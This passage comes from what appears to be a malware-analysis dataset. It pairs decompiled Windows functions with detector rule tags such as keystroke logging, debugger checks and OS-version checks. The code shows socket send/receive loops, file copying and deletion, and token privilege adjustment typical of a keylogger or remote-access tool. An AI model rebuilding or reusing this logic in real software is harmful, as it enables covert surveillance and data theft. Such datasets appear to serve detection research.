0x49173b;\n                fcn.00405738();\n                iStackY200 = 0x491746;\n                iStackY200 = fcn.004058fc();\n                iStackY204 = 0x49174c;\n                sub.kernel32.dll_SetFileAttributesA();\n                iStackY204 = 0x491757;\n                fcn.0048d390();\n                iStackY204 = 0x491767;\n                fcn.00405738();\n                iStackY204 = 0x491778;\n                iStackY204 = fcn.004058fc();\n                uStackY208 = 0x49177e;\n                sub.kernel32.dll_DeleteFileA();\n                uStackY208 = 0;\n                uStackY212 = 0x491794;\n                fcn.0048d390();\n                uStackY212 = 0x4917a4;\n                fcn.00405738();\n                uStackY212 = 0x4917af;\n                uStackY212 = fcn.004058fc();\n                uStackY216 = 0x4917bb;\n                fcn.0048d2c8();\n                uStackY216 = 0x4917cb;\n                fcn.00405738();\n                uStackY216 = 0x4917d6;\n                uStackY216 = fcn.004058fc();\n                uStackY220 = 0x4917dc;\n                sub.kernel32.dll_CopyFileA();\n            }\n            break;\n        }\n        uStackY176 = 0x4917f3;\n        fcn.004038e8(0);\n        uStackY176 = 0x4917f8;\n        fcn.0040304c();\n        uStackY176 = 0;\n        uStackY180 = 0x2000;\n        puStackY184 = &stack0xffffdfc7;\n        uStackY192 = 0x49180f;\n        iVar1 = sub.wsock32.dll_send();\n    } while (iVar1 != -1);\n    uStackY196 = 2;\n    iStackY200 = var_30h;\n    iStackY204 = 0x491821;\n    sub.wsock32.dll_shutdown();\n    iStackY204 = var_30h;\n    uStackY208 = 0x49182a;\n    sub.wsock32.dll_closesocket();\n    uStackY208 = 0;\n    // WARNING: Subroutine does not return\n    uStackY212 = 0x491831;\n    sub.kernel32.dll_ExitThread();\n}\n",
        "token_count": 2942
    },
    "00491a88": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "log keystrokes via raw input data/18af53aa16f24c3fa3538f182ae5df5a"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.00491a88 noreturn (uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t *piVar2;\n    int32_t *piVar3;\n    uint arg_8h_00;\n    int32_t iVar4;\n    uint *in_FS_OFFSET;\n    uchar auStackY8248 [3892];\n    uint uStackY4356;\n    uchar *puStackY4348;\n    uint uStack4216;\n    uint uStack4212;\n    uchar *puStack4208;\n    uint uStack4204;\n    uint uStack4200;\n    uchar *puStack4196;\n    uint var_30h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack4208 = &stack0xfffffffc;\n    iVar1 = 2;\n    do {\n        iVar1 = iVar1 + -1;\n    } while (iVar1 != 0);\n    puStack4196 = 0x491ad2;\n    fcn.00405f08();\n    uStack4200 = 0x491e2a;\n    uStack4204 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffef94;\n    uStack4212 = 0x491de0;\n    uStack4216 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffef88;\n    puStack4196 = &stack0xfffffffc;\n    fcn.00408460();\n    fcn.00405504();\n    fcn.00405504();\n    fcn.00405504();\n    iVar1 = sub.wsock32.dll_socket();\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_htons();\n    iVar1 = sub.wsock32.dll_inet_addr();\n    if ((iVar1 == -1) && (iVar1 = sub.wsock32.dll_gethostbyname(),  iVar1 == 0)) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.wsock32.dll_connect();\n    iVar1 = sub.wsock32.dll_recv();\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    fcn.00405800();\n    fcn.0049393c();\n    iVar1 = sub.wsock32.dll_recv();\n    if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n        sub.kernel32.dll_ExitThread();\n    }\n    sub.ole32.dll_CoInitialize();\n    fcn.00409dd8();\n    fcn.004302ec();\n    piVar2 = fcn.00404610();\n    iVar1 = **0x4a5110;\n    do {\n        if (iVar1 != 1) {\n    // WARNING: Subroutine does not return\n            fcn.004919f0(&stack0xfffffffc);\n        }\n        iVar1 = sub.wsock32.dll_recv();\n        if (iVar1 < 1) {\n            fcn.004938a4();\n    // WARNING: Subroutine does not return\n            fcn.004919f0(&stack0xfffffffc);\n        }\n        fcn.0042cbe0();\n        piVar3 = fcn.00431a5c();\n        fcn.00430378();\n        (**(*piVar3 + 8))();\n        (**(*piVar3 + 0x58))();\n        puStackY4348 = 0x491ce4;\n        fcn.0041b4ac(0, 0);\n        puStackY4348 = 0x491ceb;\n        arg_8h_00 = (***piVar2)();\n        fcn.00409d58(arg_8h_00);\n        fcn.00405784();\n        fcn.004939cc();\n        iVar1 = sub.wsock32.dll_recv();\n        if (iVar1 == -1) {\n    // WARNING: Subroutine does not return\n            fcn.004919f0(&stack0xfffffffc);\n        }\n        while( true ) {\n            fcn.00403ae4();\n            iVar1 = (**(*piVar2 + 0xc))();\n            if ((iVar1 == 0) || (iVar4 = sub.wsock32.dll_send(),  iVar4 == -1)) break;\n            puStackY4348 = &stack0xffffdfc8;\n            uStackY4356 = 0x491d95;\n            iVar4 = sub.wsock32.dll_recv();\n            if ((iVar4 == -1) || (iVar1 == 0)) break;\n        }\n        fcn.004939cc();\n        fcn.0041bbbc();\n        fcn.0040f840();\n        fcn.0040f840();\n        iVar1 = **0x4a5110;\n    } while( true );\n}\n",
        "token_count": 1116
    },
    "00492f94": {
        "rules": [
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1"
        ],
        "decompiled_code": "\n// WARNING: Variable defined which should be unmapped: var_1h\n\nvoid fcn.00492f94(void)\n\n{\n    uint uVar1;\n    char in_AL;\n    char cVar2;\n    uint *in_FS_OFFSET;\n    uchar uVar3;\n    uint uStack64;\n    uint uStack60;\n    uchar *puStack56;\n    uint uStack52;\n    uint uStack48;\n    uchar *puStack44;\n    uint uStack40;\n    uint uStack36;\n    uchar *puStack32;\n    uint var_ch;\n    uint var_8h;\n    uint var_1h;\n    \n    puStack32 = &fcn.00492f94::var_1h + 1;\n    puStack44 = &fcn.00492f94::var_1h + 1;\n    uStack36 = 0x4930ee;\n    uStack40 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffd8;\n    uVar3 = true;\n    uStack48 = 0x4930bf;\n    uStack52 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffcc;\n    puStack56 = 0x492fd0;\n    fcn.00405894();\n    if (uVar3) {\n        puStack56 = 0x492fe9;\n        fcn.00483938();\n    }\n    puStack56 = 0x492ffa;\n    fcn.00405894();\n    if (uVar3) {\n        puStack56 = 0x493001;\n        fcn.004862a4();\n    }\n    uStack60 = 0x49304f;\n    uStack64 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffc0;\n    puStack56 = &fcn.00492f94::var_1h + 1;\n    fcn.0048019c();\n    fcn.004802dc();\n    fcn.00480c6c();\n    fcn.00480d5c();\n    fcn.00480e4c();\n    fcn.00480f3c();\n    fcn.0048064c();\n    fcn.004807bc();\n    *in_FS_OFFSET = uStack64;\n    if (in_AL == '\\x01') {\n        puStack56 = 0x493069;\n        fcn.0048d8a4();\n    }\n    puStack56 = 0x49306e;\n    cVar2 = fcn.0044d20c();\n    if (cVar2 == '\\0') {\n        puStack56 = 0x493158;\n        uStack60 = 0x493081;\n        fcn.0040f130();\n        uStack60 = 0;\n        uStack64 = 0x493184;\n        fcn.00405800();\n        fcn.0048b0c8();\n    }\n    sub.kernel32.dll_GetCurrentProcessId();\n    fcn.0048abec();\n    uVar1 = **0x4a4f1c;\n    sub.wsock32.dll_closesocket();\n    *in_FS_OFFSET = uVar1;\n    *in_FS_OFFSET = puStack56;\n    uStack48 = 0x4930f5;\n    uStack52 = 0x4930ed;\n    fcn.00405490();\n    return;\n}\n",
        "token_count": 736
    },
    "00403e58": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00403e58(void)\n\n{\n    fcn.00403d78();\n    return;\n}\n",
        "token_count": 25
    },
    "00403e80": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00403e80(uint param_1, int32_t param_2)\n\n{\n    uint *in_EAX;\n    int32_t iVar1;\n    \n    if (2 < *(in_EAX + 1) - 0xd7b1) {\n        iVar1 = fcn.004075b8();\n        *(iVar1 + 4) = 0x67;\n        return;\n    }\n    iVar1 = sub.kernel32.dll_SetFilePointer(*in_EAX, in_EAX[2] * param_2, 0, 0);\n    if (iVar1 != -1) {\n        return;\n    }\n    sub.kernel32.dll_GetLastError();\n    fcn.0040306c();\n    return;\n}\n",
        "token_count": 161
    },
    "00404534": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00404534(void)\n\n{\n    uint uVar1;\n    uint *in_FS_OFFSET;\n    uint uVar2;\n    uint uStack284;\n    uint uStack280;\n    uchar *puStack276;\n    uint var_104h;\n    uint var_4h;\n    \n    puStack276 = &stack0xfffffffc;\n    uStack280 = 0x4045bb;\n    uStack284 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack284;\n    fcn.00404520();\n    fcn.004056d0();\n    uVar1 = fcn.0040572c();\n    uVar1 = fcn.004058fc(uVar1);\n    uVar1 = fcn.0040572c(uVar1);\n    uVar1 = fcn.004058fc(uVar1);\n    uVar2 = 0x800;\n    sub.kernel32.dll_CompareStringA(0x800, 1, uVar1);\n    *in_FS_OFFSET = uVar2;\n    fcn.0040546c(0x4045c2);\n    return;\n}\n",
        "token_count": 245
    },
    "0040a068": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __fastcall fcn.0040a068(uint param_1, uint32_t param_2)\n\n{\n    uint uVar1;\n    \n    uVar1 = 0xffffffff;\n    if (((param_2 & 3) < 3) && ((param_2 & 0xf0) < 0x41)) {\n        uVar1 = fcn.004058fc(*((param_2 & 3) * 4 + 0x4a1860), *(((param_2 & 0xf0) >> 4) * 4 + 0x4a186c), 0, 3, 0x80, 0);\n        uVar1 = sub.kernel32.dll_CreateFileA_1(uVar1);\n    }\n    return uVar1;\n}\n",
        "token_count": 172
    },
    "0040b169": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040b169(uint arg_8h, uint noname_1, uint arg_10h)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t extraout_ECX;\n    uint32_t uVar3;\n    uint32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t iVar4;\n    int32_t unaff_EBP;\n    char *unaff_EDI;\n    char *pcVar5;\n    char *pcVar6;\n    uint var_2ch;\n    uint var_5h;\n    \n    uVar3 = *(unaff_EBP + 8);\n    if (0x11 < uVar3) {\n        uVar3 = 0x12;\n    }\n    iVar2 = *(unaff_EBP + -0x2c);\n    if (iVar2 < 1) {\n        pcVar5 = unaff_EDI + 1;\n        *unaff_EDI = '0';\n    }\n    else {\n        iVar4 = 0;\n        if (*(unaff_EBP + 0x10) != '\\x02') {\n            iVar4 = (*(unaff_EBP + -0x2c) - 1U) % 3 + 1;\n        }\n        while( true ) {\n            pcVar6 = unaff_EDI;\n            cVar1 = fcn.0040b0be();\n            pcVar5 = pcVar6 + 1;\n            *pcVar6 = cVar1;\n            iVar2 = extraout_ECX + -1;\n            uVar3 = extraout_EDX;\n            if (iVar2 == 0) break;\n            iVar4 = iVar4 + -1;\n            unaff_EDI = pcVar5;\n            if ((iVar4 == 0) && (*(unaff_EBP + -6) != '\\0')) {\n                *pcVar5 = *(unaff_EBP + -6);\n                iVar4 = 3;\n                unaff_EDI = pcVar6 + 2;\n            }\n        }\n    }\n    if (uVar3 != 0) {\n        pcVar6 = pcVar5;\n        if (*(unaff_EBP + -5) != '\\0') {\n            pcVar6 = pcVar5 + 1;\n            *pcVar5 = *(unaff_EBP + -5);\n        }\n        for (; iVar2 != 0; iVar2 = iVar2 + 1) {\n            *pcVar6 = '0';\n            uVar3 = uVar3 - 1;\n            if (uVar3 == 0) {\n                return;\n            }\n            pcVar6 = pcVar6 + 1;\n        }\n        do {\n            cVar1 = fcn.0040b0be();\n            *pcVar6 = cVar1;\n            pcVar6 = pcVar6 + 1;\n        } while (extraout_EDX_00 != 1);\n    }\n    return;\n}\n",
        "token_count": 645
    },
    "0040ea04": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0040ea04(void)\n\n{\n    uint32_t uVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uint *puVar4;\n    \n    *0x4a88c8 = 0x409;\n    *0x4a88cc = 9;\n    *0x4a88d0 = 1;\n    uVar1 = sub.kernel32.dll_GetThreadLocale_1();\n    if (uVar1 != 0) {\n        *0x4a88c8 = uVar1;\n    }\n    if (uVar1 != 0) {\n        *0x4a88cc = uVar1 & 0x3ff;\n        *0x4a88d0 = (uVar1 & 0xffff) >> 10;\n    }\n    puVar3 = 0x40eaa8;\n    puVar4 = 0x4a1830;\n    for (iVar2 = 8; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar4 = *puVar3;\n        puVar3 = puVar3 + 1;\n        puVar4 = puVar4 + 1;\n    }\n    if ((*0x4a17ec < 5) || (*0x4a17e8 != 2)) {\n        iVar2 = sub.user32.dll_GetSystemMetrics(0x4a);\n        *0x4a88d5 = iVar2 != 0;\n    }\n    else {\n        *0x4a88d5 = true;\n    }\n    iVar2 = sub.user32.dll_GetSystemMetrics(0x2a);\n    *0x4a88d4 = iVar2 != 0;\n    if (*0x4a88d4) {\n        fcn.0040e9a8(&stack0xfffffffc);\n    }\n    return;\n}\n",
        "token_count": 413
    },
    "0041645c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0041645c(uint param_1, uint *param_2)\n\n{\n    char *pcVar1;\n    code *pcVar2;\n    int32_t *in_EAX;\n    uint *puVar3;\n    uint8_t uVar4;\n    \n    pcVar1 = **param_2;\n    uVar4 = 4;\n    if (*pcVar1 != '\\a') {\n        uVar4 = pcVar1[pcVar1[1] + 2];\n    }\n    pcVar2 = param_2[2];\n    if (*(param_2 + 0xb) == 0xff) {\n        puVar3 = in_EAX + (pcVar2 & 0xffffff);\n        *puVar3 = param_1;\n        if ((1 < uVar4) && (*puVar3 = param_1,  3 < uVar4)) {\n            *puVar3 = param_1;\n        }\n    }\n    else if (*(param_2 + 0xb) < 0xfe) {\n        (*pcVar2)();\n    }\n    else {\n        (**(pcVar2 + *in_EAX))();\n    }\n    return;\n}\n",
        "token_count": 258
    },
    "004202e0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004202e0(int32_t arg_8h, uint arg_ch, uint noname_2, int32_t arg_14h, int32_t *arg_18h)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint uStack36;\n    uint uStack32;\n    uchar *puStack28;\n    uint var_8h;\n    uint var_4h;\n    \n    puStack28 = &stack0xfffffffc;\n    uStack32 = 0x42034a;\n    uStack36 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &uStack36;\n    if ((arg_14h < 0) || (2 < arg_14h)) {\n        uVar2 = 0x80030001;\n        *in_FS_OFFSET = uStack36;\n    }\n    else {\n        iVar1 = (**(**(arg_8h + 0xc) + 0x14))();\n        if (arg_18h != NULL) {\n            *arg_18h = iVar1;\n            arg_18h[1] = iVar1 >> 0x1f;\n        }\n        uVar2 = 0;\n        *in_FS_OFFSET = uStack36;\n    }\n    return uVar2;\n}\n",
        "token_count": 284
    },
    "00429458": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.00429458(uint param_1, int32_t param_2)\n\n{\n    uint32_t uVar1;\n    int32_t in_EAX;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    param_2 = param_2 + -1;\n    if (-1 < param_2) {\n        if (**0x4a505c < 3) {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = uVar1 >> 0x10 & 0xff | CONCAT11(uVar1, uVar1 >> 8) << 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n        else {\n            do {\n                uVar1 = *(in_EAX + param_2 * 4);\n                *(in_EAX + param_2 * 4) = ((uVar1 & 0xff0000) >> 8 | (uVar1 & 0xff00) << 8 | uVar1 << 0x18) >> 8;\n                param_2 = param_2 + -1;\n            } while (-1 < param_2);\n        }\n    }\n    return;\n}\n",
        "token_count": 292
    },
    "00436e70": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.00436e70(void)\n\n{\n    int32_t in_EAX;\n    uint *puVar1;\n    uint uVar2;\n    \n    puVar1 = (***(in_EAX + 4))();\n    *(in_EAX + 0x1c4) = puVar1;\n    *puVar1 = 0x4369bc;\n    puVar1[2] = 0;\n    puVar1[10] = *(in_EAX + 0x70) * *(in_EAX + 0x78);\n    if (*(in_EAX + 0x138) == 2) {\n        puVar1[1] = fcn.004369d0;\n        puVar1[3] = fcn.00436c38;\n        uVar2 = (**(*(in_EAX + 4) + 4))();\n        puVar1[8] = uVar2;\n    }\n    else {\n        puVar1[1] = fcn.00436a88;\n        puVar1[3] = fcn.00436ac0;\n        puVar1[8] = 0;\n    }\n    fcn.00436904();\n    return;\n}\n",
        "token_count": 262
    },
    "0043804c": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid fcn.0043804c(void)\n\n{\n    int32_t iVar1;\n    int32_t *in_EAX;\n    uint *puVar2;\n    \n    puVar2 = (**in_EAX[1])();\n    in_EAX[0x73] = puVar2;\n    *puVar2 = 0x437f60;\n    puVar2[2] = 0x438038;\n    puVar2[3] = 0x43803c;\n    puVar2[0x11] = 0;\n    puVar2[0xd] = 0;\n    if (4 < in_EAX[0x1e]) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x37;\n        *(iVar1 + 0x18) = 4;\n        (***in_EAX)();\n    }\n    if (0x100 < in_EAX[0x18]) {\n        iVar1 = *in_EAX;\n        *(iVar1 + 0x14) = 0x39;\n        *(iVar1 + 0x18) = 0x100;\n        (***in_EAX)();\n    }\n    fcn.004375d8();\n    fcn.0043778c();\n    if (in_EAX[0x16] == 2) {\n        fcn.00437f20();\n    }\n    return;\n}\n",
        "token_count": 308
    },
    "00457908": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.00457908(void)\n\n{\n    uint32_t uVar1;\n    uint8_t uVar2;\n    char cVar3;\n    int32_t in_EAX;\n    int32_t *piVar4;\n    uint32_t uVar5;\n    int32_t iVar6;\n    uint uVar7;\n    \n    uVar7 = 0;\n    piVar4 = fcn.0045784c();\n    if (piVar4 == NULL) {\n        if ((*(in_EAX + 0x1c) & 0x10) == 0) {\n            cVar3 = fcn.004047cc();\n            if (cVar3 != '\\0') {\n                fcn.004568f4();\n            }\n        }\n    }\n    else {\n        if ((*(piVar4 + 7) & 0x10) == 0) {\n            fcn.004568f4();\n        }\n        (**(*piVar4 + 0x44))();\n        uVar5 = fcn.00456fb4();\n        uVar2 = fcn.0045749c();\n        if ((uVar5 | uVar2) != 0) {\n            fcn.0045474c();\n        }\n        uVar1 = *(**0x4a4f48 + 0x44);\n        uVar5 = uVar5 & 0xffffff00;\n        if (((uVar1 != 0) && (uVar5 = uVar1,  *(uVar1 + 0x277) == '\\x02')) && (piVar4 == *(uVar1 + 0x2a0))) {\n            iVar6 = sub.user32.dll_SendMessageA(*(uVar1 + 0x29c), 0x234, 0, 0);\n            if (iVar6 != 0) {\n                uVar7 = fcn.00466ca8();\n                sub.user32.dll_DrawMenuBar(uVar7);\n            }\n        }\n        uVar7 = CONCAT31(uVar5 >> 8, 1);\n    }\n    return uVar7;\n}\n",
        "token_count": 454
    },
    "0045c8ac": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0045c8ac(uint arg_8h, uint arg_ch)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    uint lParam;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar1 = 0;\n    if (in_EAX != 0) {\n        uVar1 = sub.user32.dll_SendMessageA();\n    }\n    return uVar1;\n}\n",
        "token_count": 116
    },
    "004747b0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint __cdecl fcn.004747b0(uint arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    \n    iVar1 = fcn.00475100();\n    if (-1 < iVar1 + -1) {\n        do {\n            iVar2 = fcn.0047514c();\n            if (*(iVar2 + 0x273) == '\\x02') {\n                return 1;\n            }\n            iVar1 = iVar1 + -1;\n        } while (iVar1 != 0);\n    }\n    return 0;\n}\n",
        "token_count": 123
    },
    "004758f0": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nuint fcn.004758f0(void)\n\n{\n    int32_t in_EAX;\n    uint uVar1;\n    \n    uVar1 = 0xff000005;\n    if (*(in_EAX + 0x277) == '\\x02') {\n        uVar1 = 0xff00000c;\n    }\n    return uVar1;\n}\n",
        "token_count": 77
    },
    "0048e4a8": {
        "rules": [
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check if file exists/0479f02c3c8a4099bfdd7ca8c1e3802e/20122460e93841beb56e12792b6a4896"
        ],
        "decompiled_code": "\nvoid __fastcall fcn.0048e4a8(uint param_1, char param_2)\n\n{\n    int32_t iVar1;\n    uint uVar2;\n    uint *in_FS_OFFSET;\n    uint in_stack_ffffff6c;\n    uint uStack112;\n    uint uStack108;\n    uchar *puStack104;\n    uint uStack100;\n    uint uStack96;\n    uint *puStack92;\n    uint uStack88;\n    uint uStack84;\n    uchar *puStack80;\n    uint uStack76;\n    uint uStack72;\n    uchar *puStack68;\n    uint var_30h;\n    uint uStack48;\n    uint uStack44;\n    uint uStack40;\n    uint var_20h;\n    uint var_1ch;\n    uint uStack28;\n    uint var_14h;\n    uint var_10h;\n    uint TokenHandle;\n    uchar var_5h;\n    uint var_4h;\n    \n    puStack80 = &stack0xfffffffc;\n    puStack68 = 0x48e4be;\n    fcn.004058ec();\n    uStack72 = 0x48e5d6;\n    uStack76 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffb4;\n    uStack84 = 0x48e5af;\n    uStack88 = *in_FS_OFFSET;\n    *in_FS_OFFSET = &stack0xffffffa8;\n    var_5h = true;\n    if (**0x4a5164 == 2) {\n        var_5h = 0;\n        puStack92 = &fcn.0048e4a8::TokenHandle;\n        uStack96 = 0x28;\n        uStack100 = 0x48e504;\n        puStack68 = &stack0xfffffffc;\n        uStack100 = sub.kernel32.dll_GetCurrentProcess();\n        puStack104 = 0x48e50a;\n        iVar1 = sub.advapi32.dll_OpenProcessToken();\n        if (iVar1 != 0) {\n            uStack108 = 0x48e593;\n            uStack112 = *in_FS_OFFSET;\n            *in_FS_OFFSET = &stack0xffffff90;\n            puStack104 = &stack0xfffffffc;\n            uVar2 = fcn.004058fc(&fcn.0048e4a8::var_1ch);\n            iVar1 = sub.advapi32.dll_LookupPrivilegeValueA(0, uVar2);\n            if (iVar1 != 0) {\n                var_20h = 1;\n                if (param_2 == '\\0') {\n                    var_14h = 0;\n                }\n                else if (param_2 == '\\x01') {\n                    var_14h = 2;\n                }\n                var_10h = 0;\n                var_30h = 1;\n                uStack48 = var_1ch;\n                uStack44 = uStack28;\n                uStack40 = var_14h;\n                in_stack_ffffff6c = TokenHandle;\n                sub.advapi32.dll_AdjustTokenPrivileges\n                          (TokenHandle, 0, &fcn.0048e4a8::var_20h, 0x10, &fcn.0048e4a8::var_30h, &fcn.0048e4a8::var_10h)\n                ;\n            }\n            *in_FS_OFFSET = in_stack_ffffff6c;\n            sub.kernel32.dll_CloseHandle_1(TokenHandle, 0x48e59a);\n            return;\n        }\n        puStack104 = 0x48e59f;\n        iVar1 = sub.kernel32.dll_GetLastError_1();\n        var_5h = iVar1 == 0;\n        *in_FS_OFFSET = uStack100;\n    }\n    else {\n        *in_FS_OFFSET = uStack88;\n        puStack68 = &stack0xfffffffc;\n    }\n    *in_FS_OFFSET = uStack88;\n    puStack80 = 0x48e5dd;\n    uStack84 = 0x48e5d5;\n    fcn.0040546c();\n    return;\n}\n",
        "token_count": 898
    },
    "00421568": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nulong fcn.00421568(void)\n\n{\n    uchar *arg_8h;\n    uint uVar1;\n    uchar auStack8 [4];\n    \n    uVar1 = 4;\n    arg_8h = auStack8;\n    fcn.00421664(arg_8h, 4);\n    if (uVar1 != '\\x03') {\n        fcn.00420aa0();\n    }\n    return CONCAT44(uVar1, arg_8h);\n}\n",
        "token_count": 104
    },
    "004375d8": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nvoid fcn.004375d8(void)\n\n{\n    int32_t iVar1;\n    uchar uVar2;\n    int32_t *in_EAX;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    int32_t iVar7;\n    uchar *puVar8;\n    int32_t iStack56;\n    int32_t iStack52;\n    int32_t iStack40;\n    int32_t *piStack36;\n    int32_t *piStack32;\n    \n    iVar7 = in_EAX[0x73];\n    uVar3 = fcn.00437498();\n    if (in_EAX[0x1e] == 3) {\n        iVar4 = *in_EAX;\n        *(iVar4 + 0x18) = uVar3;\n        *(iVar4 + 0x1c) = *(iVar7 + 0x20);\n        *(iVar4 + 0x20) = *(iVar7 + 0x24);\n        *(iVar4 + 0x24) = *(iVar7 + 0x28);\n        *(*in_EAX + 0x14) = 0x5e;\n        (**(*in_EAX + 4))();\n    }\n    else {\n        iVar7 = *in_EAX;\n        *(iVar7 + 0x14) = 0x5f;\n        *(iVar7 + 0x18) = uVar3;\n        (**(*in_EAX + 4))();\n    }\n    iVar7 = in_EAX[0x1e];\n    iVar4 